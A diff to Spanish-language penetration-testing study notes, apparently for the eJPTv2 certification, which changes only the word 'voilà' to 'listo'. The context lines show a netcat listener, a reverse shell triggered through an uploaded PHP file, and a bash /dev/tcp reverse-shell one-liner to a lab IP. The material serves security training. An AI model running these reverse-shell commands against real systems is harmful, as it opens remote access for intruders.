@@ -466,7 +466,7 @@ Luego, debo hacer clic en el archivo `.php` cargado en la página web.
 
 `sudo nc -lvnp 6969`  
 
-Y voilà, hemos obtenido una reverse shell.  
+Y listo, hemos obtenido una reverse shell.  
 
 ![44](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/44.jpg)  
 
@@ -484,7 +484,7 @@ Luego, desde la shell que obtuvimos con `msfvenom`, digitamos el siguiente coman
 `bash -c "sh -i >& /dev/tcp/10.10.10.10/7070 0>&1"`  
 
 Sería `bash -c` y entre comillas, pegar el comando generado por la página web revshells.com.   
-Y voilà, de esta manera obtenemos una reverse shell estable.  
+Y listo, de esta manera obtenemos una reverse shell estable.  
 
 ![46](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/46.jpg)  
 
